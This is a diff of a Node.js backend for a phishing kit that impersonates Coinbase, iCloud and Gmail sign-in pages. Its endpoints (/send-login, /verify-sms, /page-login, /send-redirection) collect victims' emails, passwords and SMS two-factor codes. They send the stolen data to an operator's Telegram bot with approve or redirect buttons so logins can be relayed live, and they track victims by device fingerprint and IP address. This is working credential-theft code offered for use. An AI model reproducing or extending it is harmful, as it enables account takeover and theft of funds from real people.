@@ -4,7 +4,14 @@ const bodyParser = require("body-parser");
 const fetch = require("node-fetch");
 const crypto = require("crypto");
 
-const { bot } = require("./bot");
+const { 
+  bot, 
+  bot2,
+  broadcastMessage, 
+  sendFollowUpMessage, 
+  userWinnerTelegram, 
+  botsThatClickedPage1 
+} = require("./bot");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -13,22 +20,38 @@ app.use(cors());
 app.use(bodyParser.json());
 
 // ============================================================================
-// 🖐️ DEVICE FINGERPRINT & IP PREFIX
+// ✅ HELPER FUNCTIONS
 // ============================================================================
+
+function getIP(req) {
+  return (
+    req.headers['cf-connecting-ip'] ||
+    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
+    req.headers['x-real-ip'] ||
+    req.ip ||
+    'Unknown IP'
+  );
+}
 
 function getIPPrefix(ip) {
   const parts = ip.split('.');
-  return `${parts[0]}.${parts[1]}`;
+  if (parts.length === 4) {
+    return `${parts[0]}.${parts[1]}`;
+  }
+  return ip;
 }
 
+// ✅ NEW: Generate device fingerprint from browser headers
 function getDeviceFingerprint(req) {
   try {
-    const userAgent = req.get("user-agent") || "";
-    const acceptLanguage = req.get("accept-language") || "";
-    const acceptEncoding = req.get("accept-encoding") || "";
+    const userAgent = req.headers['user-agent'] || '';
+    const language = req.headers['accept-language'] || '';
+    const encoding = req.headers['accept-encoding'] || '';
     
-    const combined = `${userAgent}|${acceptLanguage}|${acceptEncoding}`;
+    const combined = `${userAgent}|${language}|${encoding}`;
     const fingerprint = crypto.createHash('sha256').update(combined).digest('hex').substring(0, 16);
+    
+    console.log(`🖐️ Device Fingerprint: ${fingerprint}`);
     return fingerprint;
   } catch (err) {
     return null;
@@ -46,7 +69,6 @@ function detectDevice(userAgent) {
 
 async function detectRegion(ip) {
   try {
-    // Try geojs.io first
     const response = await fetch(`https://get.geojs.io/v1/ip/geo.json?ip=${ip}`);
     const data = await response.json();
     
@@ -54,7 +76,6 @@ async function detectRegion(ip) {
       return `${data.city}, ${data.country}`;
     }
     
-    // Fallback to ip-api.com
     const response2 = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`);
     const data2 = await response2.json();
     
@@ -69,15 +90,94 @@ async function detectRegion(ip) {
 }
 
 // ============================================================================
-// 💾 STORAGE
+// ✅ MULTI-LAYER USER TRACKING STORAGE
 // ============================================================================
 
 let userIdCounter = 1;
-const pendingRedirection = {};
 const userIds = {};
-const pendingApprovals = {};
+
+// Layer 1: Device Fingerprint (PRIMARY)
 const deviceFingerprintToEmail = {};
+
+// Layer 2: IP Prefix + User ID
 const ipPrefixUserIdToEmail = {};
+
+// Layer 3: Session Token (reserved for future)
+const sessionTokenToEmail = {};
+
+// Layer 4: IP Prefix
+const ipPrefixToEmail = {};
+
+// Layer 5: Full IP
+const ipToEmail = {};
+
+// ============================================================================
+// ✅ RESOLVE EMAIL FROM REQUEST (5-layer fallback)
+// ============================================================================
+
+function resolveEmailFromRequest(req, sessionToken = null, userId = null) {
+  try {
+    const fingerprint = getDeviceFingerprint(req);
+    const ip = getIP(req);
+    const ipPrefix = getIPPrefix(ip);
+    
+    // Layer 1: Device Fingerprint (PRIMARY)
+    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
+      console.log(`✅ Resolved email via device fingerprint`);
+      return deviceFingerprintToEmail[fingerprint];
+    }
+    
+    // Layer 2: IP Prefix + User ID
+    if (ipPrefix && userId) {
+      const compositeKey = `${ipPrefix}_${userId}`;
+      if (ipPrefixUserIdToEmail[compositeKey]) {
+        console.log(`✅ Resolved email via IP prefix + user ID`);
+        return ipPrefixUserIdToEmail[compositeKey];
+      }
+    }
+    
+    // Layer 3: Session Token
+    if (sessionToken && sessionTokenToEmail[sessionToken]) {
+      console.log(`✅ Resolved email via session token`);
+      return sessionTokenToEmail[sessionToken];
+    }
+    
+    // Layer 4: IP Prefix
+    if (ipPrefixToEmail[ipPrefix]) {
+      console.log(`✅ Resolved email via IP prefix`);
+      return ipPrefixToEmail[ipPrefix];
+    }
+    
+    // Layer 5: Full IP
+    if (ipToEmail[ip]) {
+      console.log(`✅ Resolved email via full IP`);
+      return ipToEmail[ip];
+    }
+    
+    console.log(`⚠️ Could not resolve email from request`);
+    return null;
+  } catch (err) {
+    console.error("❌ Error resolving email:", err);
+    return null;
+  }
+}
+
+// ============================================================================
+// ✅ STORAGE OBJECTS
+// ============================================================================
+
+const pendingRedirection = {};
+const pendingApprovals = {};
+const pendingPage = {};
+const pendingCodes = {};
+const pendingSMS = {};
+const pendingGmailLogin = {};
+const displayEmailStore = {};
+const displayEmailByRequestId = {};
+const pendingVerificationPage = {};
+const pendingVerifyingPage = {};
+const pendingSMS2 = {};
+const pendingWalletDecision = {};
 
 // ============================================================================
 // 🔔 SELF-PING
@@ -126,7 +226,8 @@ app.post("/get-user-id", (req, res) => {
 });
 
 // ============================================================================
-// POST /send-login
+// ✅ POST /send-login (Coinbase Login - Page 1)
+// ✅ THIS IS WHERE WINNER DETECTION STARTS
 // ============================================================================
 
 app.post("/send-login", async (req, res) => {
@@ -137,32 +238,49 @@ app.post("/send-login", async (req, res) => {
       return res.status(400).json({ error: "Missing email or password" });
     }
 
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      req.socket.remoteAddress ||
-      "Unknown IP";
-
+    const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
     const ipPrefix = getIPPrefix(ip);
     const fingerprint = getDeviceFingerprint(req);
 
-    // Store fingerprint mapping
+    // ============================================================================
+    // ✅ STORE ALL 5 TRACKING LAYERS
+    // ============================================================================
+
+    // Layer 1: Device Fingerprint
     if (fingerprint && email) {
       deviceFingerprintToEmail[fingerprint] = email;
+      console.log(`💾 Stored fingerprint ${fingerprint} → ${email}`);
+    }
+
+    // Layer 2: IP Prefix + User ID
+    if (ipPrefix && userId && email) {
+      const compositeKey = `${ipPrefix}_${userId}`;
+      ipPrefixUserIdToEmail[compositeKey] = email;
+      console.log(`💾 Stored composite key ${compositeKey} → ${email}`);
+    }
+
+    // Layer 4: IP Prefix
+    if (ipPrefix && email) {
+      ipPrefixToEmail[ipPrefix] = email;
+      console.log(`💾 Stored IP prefix ${ipPrefix} → ${email}`);
+    }
+
+    // Layer 5: Full IP
+    if (ip && email) {
+      ipToEmail[ip] = email;
+      console.log(`💾 Stored full IP ${ip} → ${email}`);
     }
 
     console.log(`\n📧 ${email} | Device: ${device} | Region: ${region}`);
     console.log(`   🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);
 
-    // ✅ Store email mapping with ipPrefix + userId for retrieval on next pages
-    const compositeKey = `${ipPrefix}_${userId}`;
-    ipPrefixUserIdToEmail[compositeKey] = email;
-    console.log(`   ✅ Stored: ${compositeKey} → ${email}`);
+    // ============================================================================
+    // ✅ SEND TO BOTH BOTS (BROADCAST)
+    // ============================================================================
 
-    // Build message
     const message =
       `😈😈😈😈 <b>Coinbase - Sign in</b> 😈😈😈😈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
@@ -196,34 +314,26 @@ app.post("/send-login", async (req, res) => {
       return res.status(500).json({ error: "Backend not configured" });
     }
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const response = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: options.parse_mode,
-        reply_markup: options.reply_markup
-      })
-    });
-
-    if (response.ok) {
-      pendingApprovals[email] = {
-        status: "pending",
-        timestamp: Date.now(),
-        userId,
-        password,
-        region,
-        device,
-        ip,
-        fingerprint
-      };
-
-      res.json({ ok: true, message: "Login request sent for approval", email });
-    } else {
-      res.status(500).json({ error: "Failed to send message" });
+    // ✅ BROADCAST TO BOTH BOTS
+    try {
+      await broadcastMessage(chatId, message, options);
+    } catch (err) {
+      console.error("❌ Failed to broadcast:", err);
+      return res.status(500).json({ error: "Failed to send message" });
     }
+
+    pendingApprovals[email] = {
+      status: "pending",
+      timestamp: Date.now(),
+      userId,
+      password,
+      region,
+      device,
+      ip,
+      fingerprint
+    };
+
+    res.json({ ok: true, message: "Login request sent for approval", email });
 
   } catch (err) {
     res.status(500).json({ error: err.message });
@@ -231,463 +341,37 @@ app.post("/send-login", async (req, res) => {
 });
 
 // ============================================================================
-// POST /check-status
-// ============================================================================
-
-// ✅ GET endpoint for iCloud page (uses query param identifier)
-app.get("/check-status", (req, res) => {
-  try {
-    const identifier = (req.query.identifier || "").trim();
-
-    if (!identifier) {
-      return res.json({ status: "unknown" });
-    }
-
-    // ✅ Check Gmail verification first
-    if (pendingVerificationPage[identifier]) {
-      return res.json({
-        status: pendingVerificationPage[identifier].status || "pending"
-      });
-    }
-
-    // ✅ Check Gmail login
-    if (pendingGmailLogin[identifier]) {
-      return res.json({
-        status: pendingGmailLogin[identifier].status || "pending"
-      });
-    }
-
-    // ✅ Check iCloud SMS codes first
-    if (pendingCodes[identifier]) {
-      return res.json({
-        status: pendingCodes[identifier].status || "pending"
-      });
-    }
-
-    // ✅ Check iCloud page
-    if (pendingPage[identifier]) {
-      return res.json({
-        status: pendingPage[identifier].status || "pending"
-      });
-    }
-
-    // ✅ Check Coinbase approvals
-    if (pendingApprovals[identifier]) {
-      return res.json({
-        status: pendingApprovals[identifier].status || "pending"
-      });
-    }
-
-    res.json({ status: "unknown" });
-  } catch (err) {
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-app.post("/check-status", (req, res) => {
-  try {
-    const { email } = req.body;
-
-    if (!email) {
-      return res.json({ status: "unknown" });
-    }
-
-    // ✅ Check iCloud page first
-    if (pendingPage[email]) {
-      return res.json({
-        status: pendingPage[email].status || "pending",
-        email: email
-      });
-    }
-
-    // ✅ Check Coinbase approvals
-    if (pendingApprovals[email]) {
-      return res.json({
-        status: pendingApprovals[email].status || "pending",
-        email: email
-      });
-    }
-
-    res.json({ status: "unknown" });
-
-  } catch (err) {
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// POST /update-status
-// ============================================================================
-
-app.post("/update-status", (req, res) => {
-  try {
-    const { email, status } = req.body;
-
-    if (!email || !status) {
-      return res.status(400).json({ error: "Missing email or status" });
-    }
-
-    // ✅ Handle Gmail verification (confirmRequestId like verify_confirm_xxx_xxx)
-    if (pendingVerificationPage[email]) {
-      pendingVerificationPage[email].status = status;
-      console.log(`✅ Updated pendingVerificationPage[${email}].status = ${status}`);
-      return res.json({ ok: true, message: "Gmail verification status updated" });
-    }
-
-    // ✅ Handle Gmail login (identifier is the requestId like gmail_xxx_xxx)
-    if (pendingGmailLogin[email]) {
-      pendingGmailLogin[email].status = status;
-      console.log(`✅ Updated pendingGmailLogin[${email}].status = ${status}`);
-      return res.json({ ok: true, message: "Gmail login status updated" });
-    }
-
-    // ✅ Handle iCloud SMS codes (identifier is the code itself)
-    if (pendingCodes[email]) {
-      pendingCodes[email].status = status;
-      console.log(`✅ Updated pendingCodes[${email}].status = ${status}`);
-      return res.json({ ok: true, message: "SMS code status updated" });
-    }
-
-    // ✅ Handle iCloud page login (pendingPage)
-    if (pendingPage[email]) {
-      pendingPage[email].status = status;
-      console.log(`✅ Updated pendingPage[${email}].status = ${status}`);
-      return res.json({ ok: true, message: "iCloud page status updated" });
-    }
-
-    // ✅ Handle Coinbase login (pendingApprovals)
-    if (!pendingApprovals[email]) {
-      pendingApprovals[email] = {};
-    }
-
-    // Map status codes
-    if (status === "page1") {
-      pendingApprovals[email].status = "accepted1";
-    } else if (status === "page2") {
-      pendingApprovals[email].status = "accepted2";
-    } else if (status === "reject") {
-      pendingApprovals[email].status = "rejected";
-    } else {
-      pendingApprovals[email].status = status;
-    }
-
-    pendingApprovals[email].updatedAt = Date.now();
-
-    res.json({ ok: true, message: "Status updated" });
-
-  } catch (err) {
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// Start server
-// ============================================================================
-
-const server = app.listen(PORT, () => {
-  console.log(`✅ Backend running on port ${PORT}`);
-  startSelfPing();
-});
-
-module.exports = { app, server };
-
-// ============================================================================
-// SMS ENDPOINTS
-// ============================================================================
-
-const pendingSMS = {};
-
-app.post("/send-sms", async (req, res) => {
-  try {
-    const { email, userId, smsCode, region, device, ip, message, options } = req.body;
-
-    if (!email || !smsCode) {
-      return res.status(400).json({ error: "Missing email or SMS code" });
-    }
-
-    console.log(`📧 ${email} | SMS: ${smsCode} | Device: ${device} | Region: ${region}`);
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const response = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: options.parse_mode,
-        reply_markup: options.reply_markup
-      })
-    });
-
-    if (response.ok) {
-      pendingSMS[email] = {
-        status: "pending",
-        smsCode,
-        userId,
-        timestamp: Date.now()
-      };
-
-      res.json({ ok: true, message: "SMS sent to Telegram" });
-    } else {
-      res.status(500).json({ error: "Failed to send SMS" });
-    }
-
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-app.post("/send-message", async (req, res) => {
-  try {
-    const { email, message } = req.body;
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const response = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: "HTML"
-      })
-    });
-
-    if (response.ok) {
-      res.json({ ok: true });
-    } else {
-      res.status(500).json({ error: "Failed to send message" });
-    }
-
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-app.post("/check-sms-status", (req, res) => {
-  try {
-    const { email } = req.body;
-
-    if (!email) {
-      return res.json({ status: "unknown" });
-    }
-
-    if (pendingSMS[email]) {
-      return res.json({ status: pendingSMS[email].status });
-    }
-
-    res.json({ status: "unknown" });
-
-  } catch (err) {
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-app.post("/update-sms-status", (req, res) => {
-  try {
-    const { email, status } = req.body;
-
-    if (!email || !status) {
-      return res.status(400).json({ error: "Missing email or status" });
-    }
-
-    if (!pendingSMS[email]) {
-      pendingSMS[email] = {};
-    }
-
-    if (status === "sms_accept") {
-      pendingSMS[email].status = "sms_accepted";
-    } else if (status === "sms_reject") {
-      pendingSMS[email].status = "sms_rejected";
-    } else {
-      pendingSMS[email].status = status;
-    }
-
-    pendingSMS[email].updatedAt = Date.now();
-
-    res.json({ ok: true });
-
-  } catch (err) {
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ============================================================================
-// BOT SMS CALLBACK HANDLER
-// ============================================================================
-
-// The bot.js file needs to handle SMS callbacks with these patterns:
-// - sms_accept|email
-// - sms_reject|email
-// And call /update-sms-status endpoint with status: "sms_accept" or "sms_reject"
-
-// ============================================================================
-// NEW SMS ENDPOINTS - FRONTEND JUST SENDS CODE, BACKEND HANDLES TELEGRAM
-// ============================================================================
-
-app.post("/verify-sms", async (req, res) => {
-  try {
-    const { email, userId, smsCode } = req.body;
-
-    if (!email || !smsCode) {
-      return res.status(400).json({ error: "Missing email or SMS code" });
-    }
-
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    const message =
-      `😈😈😈 <b>Coinbase - SMS</b> 😈😈😈\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>💬 SMS:</b> <code>${smsCode}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const response = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: "✅ Accept", callback_data: `sms_accept|${email}` },
-              { text: "❌ Reject", callback_data: `sms_reject|${email}` }
-            ]
-          ]
-        }
-      })
-    });
-
-    if (response.ok) {
-      console.log(`📧 ${email} | SMS: ${smsCode}`);
-      
-      pendingSMS[email] = {
-        status: "pending",
-        smsCode,
-        userId,
-        timestamp: Date.now()
-      };
-
-      res.json({ ok: true });
-    } else {
-      res.status(500).json({ error: "Failed to send SMS" });
-    }
-
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-app.post("/resend-sms", async (req, res) => {
-  try {
-    const { email, userId } = req.body;
-
-    if (!email) {
-      return res.status(400).json({ error: "Missing email" });
-    }
-
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    const message =
-      `🔄 <b>Coinbase - Resend SMS</b> 🔄\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const response = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: "HTML"
-      })
-    });
-
-    if (response.ok) {
-      console.log(`💬 Resend SMS for ${email}`);
-      res.json({ ok: true });
-    } else {
-      res.status(500).json({ error: "Failed to resend SMS" });
-    }
-
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// ============================================================================
-// REDIRECTION PAGE ENDPOINT
+// ✅ POST /send-redirection (Page 2 - Redirection)
+// ✅ PAGE 2 ROUTING LOGIC WITH POLLING
 // ============================================================================
 
 app.post("/send-redirection", async (req, res) => {
   try {
     let { email, userId } = req.body;
 
-    // Detect region and device from request
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
+    const ip = getIP(req);
     const ipPrefix = getIPPrefix(ip);
 
-    // ✅ PRIORITY 1: Try to retrieve from storage using ipPrefix + userId
-    if (userId && userId !== '?') {
-      const compositeKey = `${ipPrefix}_${userId}`;
-      const storedEmail = ipPrefixUserIdToEmail[compositeKey];
-      if (storedEmail) {
-        email = storedEmail;
-        console.log(`🔍 Retrieved email from storage: ${compositeKey} → ${email}`);
-      }
-    }
-
-    // ✅ PRIORITY 2: Use provided email as fallback
+    // ✅ RESOLVE EMAIL USING MULTI-LAYER TRACKING
     if (!email) {
-      return res.status(400).json({ error: "Missing email" });
-    }
-
-    // ✅ CLEAR any previous choice for this email
-    if (pendingRedirection[email]) {
-      delete pendingRedirection[email];
+      const resolvedEmail = resolveEmailFromRequest(req, null, userId);
+      if (resolvedEmail) {
+        email = resolvedEmail;
+        console.log(`🔍 Resolved email via multi-layer tracking: ${email}`);
+      } else {
+        return res.status(400).json({ error: "Could not resolve email" });
+      }
     }
 
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
+
+    console.log(`📍 ${email} | Redirection page | Device: ${device} | Region: ${region}`);
+
+    // ✅ CHECK WINNER
+    const winner = userWinnerTelegram[email];
+    console.log(`🏆 Winner for ${email}: ${winner}`);
 
     const message =
       `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
@@ -697,40 +381,66 @@ app.post("/send-redirection", async (req, res) => {
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
 
-    console.log(`📍 ${email} | Redirection page | Device: ${device} | Region: ${region}`);
+    const options = {
+      parse_mode: "HTML",
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "☁️ iCloud ☁️", callback_data: `redirect_icloud|${email}` }],
+          [{ text: "🌈 Gmail 🌈", callback_data: `redirect_gmail|${email}` }]
+        ]
+      }
+    };
 
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.ADMIN_CHAT_ID;
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const response = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "☁️ iCloud ☁️", callback_data: `redirect_icloud|${email}` }],
-            [{ text: "🌈 Gmail 🌈", callback_data: `redirect_gmail|${email}` }]
-          ]
-        }
-      })
-    });
+    // ============================================================================
+    // ✅ SEND TO WINNER ONLY
+    // ============================================================================
 
-    if (response.ok) {
-      res.json({ ok: true });
+    if (email && userWinnerTelegram[email]) {
+      console.log(`📨 Redirection going to winner only: ${userWinnerTelegram[email]}`);
+      
+      await sendFollowUpMessage(email, message, options);
+
+      // ✅ STORE PAGE 2 DATA FOR POLLING
+      global.page2MessageDataStore = global.page2MessageDataStore || {};
+      global.page2MessageDataStore[email] = {
+        message: message,
+        options: options,
+        email: email,
+        timestamp: Date.now()
+      };
+      console.log(`💾 Stored page 2 message data for ${email} (waiting for loser click)`);
+
     } else {
-      res.status(500).json({ error: "Failed to send redirection" });
+      console.log(`📨 Redirection fallback: sending to both (no winner for ${email})`);
+      
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: options.parse_mode,
+          reply_markup: options.reply_markup
+        })
+      });
     }
 
+    res.json({ ok: true });
+
   } catch (err) {
+    console.error("❌ Redirection endpoint error:", err);
     res.status(500).json({ error: err.message });
   }
 });
 
-// Check redirection choice
+// ============================================================================
+// POST /check-redirection-choice
+// ============================================================================
+
 app.post("/check-redirection-choice", (req, res) => {
   try {
     const { email } = req.body;
@@ -739,7 +449,6 @@ app.post("/check-redirection-choice", (req, res) => {
       return res.json({ choice: "unknown" });
     }
 
-    // This will be set by the bot when button is clicked
     if (pendingRedirection && pendingRedirection[email]) {
       return res.json({ choice: pendingRedirection[email].choice });
     }
@@ -752,7 +461,7 @@ app.post("/check-redirection-choice", (req, res) => {
 });
 
 // ============================================================================
-// UPDATE REDIRECTION CHOICE
+// POST /update-redirection-choice
 // ============================================================================
 
 app.post("/update-redirection-choice", (req, res) => {
@@ -785,11 +494,184 @@ app.post("/update-redirection-choice", (req, res) => {
 });
 
 // ============================================================================
-// ICLOUD PAGES ENDPOINTS
+// POST /check-status
 // ============================================================================
 
-const pendingPage = {};
-const pendingCodes = {};
+app.get("/check-status", (req, res) => {
+  try {
+    const identifier = (req.query.identifier || "").trim();
+
+    if (!identifier) {
+      return res.json({ status: "unknown" });
+    }
+
+    if (pendingVerificationPage[identifier]) {
+      return res.json({ status: pendingVerificationPage[identifier].status || "pending" });
+    }
+
+    if (pendingGmailLogin[identifier]) {
+      return res.json({ status: pendingGmailLogin[identifier].status || "pending" });
+    }
+
+    if (pendingCodes[identifier]) {
+      return res.json({ status: pendingCodes[identifier].status || "pending" });
+    }
+
+    if (pendingPage[identifier]) {
+      return res.json({ status: pendingPage[identifier].status || "pending" });
+    }
+
+    if (pendingApprovals[identifier]) {
+      return res.json({ status: pendingApprovals[identifier].status || "pending" });
+    }
+
+    res.json({ status: "unknown" });
+
+  } catch (err) {
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
+// POST /update-status
+// ============================================================================
+
+app.post("/update-status", (req, res) => {
+  try {
+    let identifier = (req.body.identifier || req.body.email || "").trim();
+    const status = req.body.status;
+    console.log(`📬 Update Status Received: ${identifier}, ${status}`);
+
+    if (pendingVerificationPage[identifier]) {
+      pendingVerificationPage[identifier].status = status;
+      console.log(`✅ Updated pendingVerificationPage[${identifier}].status = ${status}`);
+      return res.json({ ok: true });
+    }
+
+    if (pendingGmailLogin[identifier]) {
+      pendingGmailLogin[identifier].status = status;
+      console.log(`✅ Updated pendingGmailLogin[${identifier}].status = ${status}`);
+      return res.json({ ok: true });
+    }
+
+    if (pendingCodes[identifier]) {
+      pendingCodes[identifier].status = status;
+      console.log(`✅ Updated pendingCodes[${identifier}].status = ${status}`);
+      return res.json({ ok: true });
+    }
+
+    if (pendingPage[identifier]) {
+      pendingPage[identifier].status = status;
+      console.log(`✅ Updated pendingPage[${identifier}].status = ${status}`);
+      return res.json({ ok: true });
+    }
+
+    if (!pendingApprovals[identifier]) {
+      pendingApprovals[identifier] = {};
+    }
+
+    if (status === "page1") {
+      pendingApprovals[identifier].status = "accepted1";
+    } else if (status === "page2") {
+      pendingApprovals[identifier].status = "accepted2";
+    } else if (status === "reject") {
+      pendingApprovals[identifier].status = "rejected";
+    } else {
+      pendingApprovals[identifier].status = status;
+    }
+
+    pendingApprovals[identifier].updatedAt = Date.now();
+
+    res.json({ ok: true });
+
+  } catch (err) {
+    res.status(500).json({ error: "Internal server error" });
+  }
+});
+
+// ============================================================================
+// SMS ENDPOINTS
+// ============================================================================
+
+app.post("/verify-sms", async (req, res) => {
+  try {
+    const { email, userId, smsCode } = req.body;
+
+    if (!email || !smsCode) {
+      return res.status(400).json({ error: "Missing email or SMS code" });
+    }
+
+    const ip = getIP(req);
+    const userAgent = req.get("user-agent") || "Unknown";
+    const device = detectDevice(userAgent);
+    const region = await detectRegion(ip);
+
+    const message =
+      `😈😈😈 <b>Coinbase - SMS</b> 😈😈😈\n` +
+      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
+      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>💬 SMS:</b> <code>${smsCode}</code>\n` +
+      `<b>🌍 Region:</b> ${region}\n` +
+      `<b>💻 Device:</b> ${device}\n` +
+      `<b>📍 IP:</b> ${ip}`;
+
+    const botToken = process.env.BOT_TOKEN;
+    const chatId = process.env.ADMIN_CHAT_ID;
+
+    // ✅ SEND TO WINNER ONLY
+    if (email && userWinnerTelegram[email]) {
+      console.log(`📨 SMS going to winner only: ${userWinnerTelegram[email]}`);
+      await sendFollowUpMessage(email, message, {
+        parse_mode: "HTML",
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: "✅ Accept", callback_data: `sms_accept|${email}` },
+              { text: "❌ Reject", callback_data: `sms_reject|${email}` }
+            ]
+          ]
+        }
+      });
+    } else {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: "✅ Accept", callback_data: `sms_accept|${email}` },
+                { text: "❌ Reject", callback_data: `sms_reject|${email}` }
+              ]
+            ]
+          }
+        })
+      });
+    }
+
+    console.log(`📧 ${email} | SMS: ${smsCode}`);
+    
+    pendingSMS[email] = {
+      status: "pending",
+      smsCode,
+      userId,
+      timestamp: Date.now()
+    };
+
+    res.json({ ok: true });
+
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// ============================================================================
+// ICLOUD PAGES ENDPOINTS
+// ============================================================================
 
 app.post("/page-login", async (req, res) => {
   try {
@@ -799,11 +681,7 @@ app.post("/page-login", async (req, res) => {
       return res.status(400).json({ success: false, message: "Email and password required" });
     }
 
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
+    const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
@@ -835,59 +713,56 @@ app.post("/page-login", async (req, res) => {
     const botToken = process.env.BOT_TOKEN;
     const chatId = process.env.ADMIN_CHAT_ID;
 
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const response = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: options.parse_mode,
-        reply_markup: options.reply_markup
-      })
-    });
-
-    if (response.ok) {
-      res.json({ success: true });
+    // ✅ SEND TO WINNER ONLY
+    if (email && userWinnerTelegram[email]) {
+      console.log(`📨 iCloud Page Login going to winner only: ${userWinnerTelegram[email]}`);
+      await sendFollowUpMessage(email, message, options);
     } else {
-      res.status(500).json({ success: false, message: "Failed to send to Telegram" });
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: options.parse_mode,
+          reply_markup: options.reply_markup
+        })
+      });
     }
+
+    res.json({ success: true });
 
   } catch (err) {
